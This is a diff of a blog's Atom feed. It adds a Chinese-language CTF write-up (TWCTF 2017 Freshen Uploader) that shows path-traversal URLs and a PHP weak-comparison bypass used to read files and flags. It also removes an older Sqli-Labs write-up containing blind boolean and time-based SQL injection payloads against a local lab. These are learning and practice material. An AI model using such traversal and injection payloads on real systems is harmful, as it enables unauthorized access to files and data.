@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-08-30T13:03:27.780Z</updated>
+  <updated>2017-08-31T11:41:01.963Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://yoursite.com/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
     <id>http://yoursite.com/3017/07/26/一些文章/</id>
     <published>3017-07-26T11:27:04.000Z</published>
-    <updated>2017-08-30T13:03:27.780Z</updated>
+    <updated>2017-08-31T11:41:01.963Z</updated>
     
     <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
 <h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
@@ -83,6 +83,7 @@
 </a></li>
 </ul>
 <h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
+<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/" target="_blank" rel="external">ISG2017-wmwcms-writeup</a></li>
 <li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/" target="_blank" rel="external">HITB CTF 2017-Pasty-writeup</a></li>
 <li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/" target="_blank" rel="external">Hackit2017-H4ck3rM1nd-writeup </a></li>
 <li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/" target="_blank" rel="external">Hackit2017-Weekands of hacker-writeup</a></li>
@@ -168,7 +169,53 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
       <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TWCTF 2017-Freshen Uploader-writeup</title>
+    <link href="http://yoursite.com/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/"/>
+    <id>http://yoursite.com/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/</id>
+    <published>2017-09-02T02:33:13.000Z</published>
+    <updated>2017-09-02T02:51:10.113Z</updated>
+    
+    <content type="html"><![CDATA[<p>TWCTF 2017-Freshen Uploader-writeup<br>任意文件读取漏洞。php弱类型比较。<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">In this year, we stopped using Windows so you can&apos;t use DOS tricks!</div><div class="line">http://fup.chal.ctf.westerns.tokyo/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>该题有两个flag。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/1.png?raw=true" alt=""></p>
+<p>有下载功能，比如点击第一个download后，链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=6a92b449761226434f5fce6c8e87295a</div></pre></td></tr></table></figure></p>
+<p>这里存在任意文件读取漏洞。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=../download.php</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/2.png?raw=true" alt=""></p>
+<p>得到download.php的源代码和第一个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;then_can_y0u_read_file_list?&#125;</div></pre></td></tr></table></figure></p>
+<p>file_list是什么东西？我们读取一下index.php看看：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/3.png?raw=true" alt=""></p>
+<p>根据第一个flag，我们可以猜测第二个flag藏在file_list.php中。但直接读取是不行的，因为download.php的源码用stripos做了检测：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// TWCTF&#123;then_can_y0u_read_file_list?&#125;</span></div><div class="line">$filename = $_GET[<span class="string">'f'</span>];</div><div class="line"><span class="keyword">if</span>(stripos($filename, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>();</div><div class="line">header(<span class="string">"Content-Type: application/octet-stream"</span>);</div><div class="line">header(<span class="string">"Content-Disposition: attachment; filename='$filename'"</span>);</div><div class="line">readfile(<span class="string">"uploads/$filename"</span>);</div></pre></td></tr></table></figure>
+<p>仔细看一下判断语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(stripos($filename, &apos;file_list&apos;) != false) die();</div></pre></td></tr></table></figure></p>
+<p>strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果<code>$filename</code>以<code>file_list</code>开头，则<code>stripos($filename, &#39;file_list&#39;)</code>会返回0，而采用的是<code>!=</code>，也就是说可能存在弱类型比较问题:<code>0 == false</code>。</p>
+<p>绕过了stripos，怎么读取file_list文件？构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=file_list/../../file_list.php</div></pre></td></tr></table></figure></p>
+<p>这样它会把第一个file_list当成文件夹，之后用两个<code>../</code>返回上一层文件夹，并最终读取到file_list.php。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/4.png?raw=true" alt=""></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://fup.chal.ctf.westerns.tokyo/download.php?f=flag_ef02dee64eb575d84ba626a78ad4e0243aeefd19145bc6502efe7018c4085213</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170902/5.png?raw=true" alt=""></p>
+<p>第二个flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWCTF&#123;php_is_very_secure&#125;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;TWCTF 2017-Freshen Uploader-writeup&lt;br&gt;任意文件读取漏洞。php弱类型比较。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
@@ -998,66 +1045,6 @@
     
       &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
 &lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sqli-Labs:Less8~10-writeup</title>
-    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
-    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
-    <published>2017-08-23T07:58:33.000Z</published>
-    <updated>2017-08-23T08:32:00.539Z</updated>
-    
-    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
-<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
-<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
-<p>发现有 字符串<code>You are in...........</code></p>
-<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
-<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
-<p>即可根据二分法得到数据库名称。</p>
-<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
-<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
-<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
-<p>之后利用脚本即可获取数据库名称。</p>
-<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
-<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
-<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
-<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
-&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
     
     </summary>
     
